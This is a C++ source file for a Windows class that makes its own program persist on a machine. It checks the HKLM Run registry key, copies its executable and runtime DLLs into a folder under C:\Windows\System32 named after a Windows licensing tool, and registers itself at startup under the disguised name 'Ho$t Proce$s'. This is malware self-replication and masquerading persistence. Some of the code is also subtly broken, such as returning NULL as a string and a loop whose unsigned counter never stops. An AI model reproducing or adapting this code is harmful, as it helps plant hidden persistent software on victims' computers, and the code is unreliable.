#include "Advanced_Utilities.h"
#include <iostream>
#include <strings.h>
#include <stdlib.h>
using namespace std;
                       

bool Advanced_Utilities::Am_I_Registered(PCWSTR pszAppName)const
{
 HKEY hKey=NULL;
 LONG lResult=0;
 bool fSuccess=true;
 DWORD dwRegType=REG_SZ;
 wchar_t szPathToExe[MAX_PATH]={};
 DWORD dwSize=sizeof(szPathToExe);
 lResult=RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ,&hKey);
 fSuccess=(lResult==0);
 
 if(fSuccess)
  {
   lResult=RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
   fSuccess=(lResult==0);
  }
  
  if(fSuccess)
   {
   	fSuccess=(wcslen(szPathToExe)>0)? true:false;
   }
  
  if(hKey!=NULL)
   {
   	RegCloseKey(hKey);
   	hKey=NULL;
   }
  return fSuccess;    
}


string Advanced_Utilities::Replicate_Self()
{
 DWORD pathlen=0;
 TCHAR temp[MAX_PATH];
 pathlen=GetModuleFileName(NULL, temp, MAX_PATH);
 if(pathlen==0)
   {
    cout<<"RUN PROGRAM AS ADMINISTRATOR FOR FULL FUNCTIONALITY\n";
    system("pause");
    return NULL;
   }
  fdll_filename_01="libstdc++-6.dll";
  fdll_filename_02="libwinpthread-1.dll";
  fdll_filename_03="libgcc_s_dw2-1.dll";
  string temp_str=temp;
  ReCompute_FilePath(temp_str);
  Copy_Files_To();
  return temp_str.erase(0,1);
} 


bool Advanced_Utilities::Write_To_Registry()
{
 //check whether program is registered and if yes return to caller
 bool state=Am_I_Registered(L"Ho$t Proce$s");
 if(state==true)
  return true;   
  
  
//replicate self    
  string newpath=Replicate_Self();
  if(newpath.size()==1)
  {
  cout<<"RUN PROGRAM AS ADMINISTRATOR FOR FULL FUNCTIONALITY\n";
   system("pause");
   return false;
  }
  
  TCHAR __array_newpath__[newpath.size()];
  for(unsigned int i=0; i<MAX_PATH; i++)
    fszPath[i]='\0';
  for(unsigned int i=0; i<newpath.size(); i++)
    __array_newpath__[i]='\0';  
  (void) newpath.copy(__array_newpath__, newpath.size(), 1);
  for(unsigned int i=0; i<strlen(__array_newpath__); i++)
    fszPath[i]=__array_newpath__[i];
    

//write to registry  
   fpathlen=strlen(fszPath);
   HKEY newvalue;
   if(RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &newvalue)!=ERROR_SUCCESS)
     {
      cout<<"RUN PROGRAM AS ADMINISTRATOR FOR FULL FUNCTIONALITY\n";
      system("pause");
      return false;
     }
                       
  DWORD pathLenInBytes=fpathlen*sizeof(*fszPath);
  if(RegSetValueEx(newvalue, TEXT("Ho$t Proce$s"), 0, REG_SZ, (LPBYTE)fszPath, pathLenInBytes)!=ERROR_SUCCESS)
    {
     RegCloseKey(newvalue);
     cout<<"RUN PROGRAM AS ADMINISTRATOR FOR FULL FUNCTIONALITY\n";
     system("pause");
     return false;  
    }	 
	
   RegCloseKey(newvalue);
   return true;		    
}



void Advanced_Utilities::Copy_Files_To()const
{
	system(fdll_filepath_03.c_str());
	system(fdll_filepath_02.c_str());
	system(fdll_filepath_01.c_str());
	system(fexe_filepath.c_str());
	return;
}



void Advanced_Utilities::ReCompute_FilePath(string&	filepath_to_exe)
{
  string newpath=" C:\\Windows\\System32\\slmgr\\";
  string copy="copy ";
	string szpath=filepath_to_exe;
	string default_path_to_files;
	
	for(unsigned i=szpath.size()-1; i>=0; --i)
		{
			if(szpath[i]=='\\')
				{
					for(unsigned k=0; k<=i; k++)
						default_path_to_files.insert(k, 1, szpath[k]);
					for(unsigned h=0,j=i+1; j<szpath.size(); h++,j++)
						fexe_filename.insert(h, 1, szpath[j]);
					break;
				}
		}
	
	filepath_to_exe=newpath;
	filepath_to_exe+=fexe_filename;
	
  fexe_filepath=copy;
  fexe_filepath+=default_path_to_files;
  fexe_filepath+=fexe_filename;
  fexe_filepath+=newpath;
  fdll_filepath_01=copy;
  fdll_filepath_01+=default_path_to_files;
  fdll_filepath_01+=fdll_filename_01;
  fdll_filepath_01+=newpath;
  fdll_filepath_02=copy;
  fdll_filepath_02+=default_path_to_files;
  fdll_filepath_02+=fdll_filename_02;
  fdll_filepath_02+=newpath;
  fdll_filepath_03=copy;
  fdll_filepath_03+=default_path_to_files;
  fdll_filepath_03+=fdll_filename_03;
  fdll_filepath_03+=newpath;
  return;
}
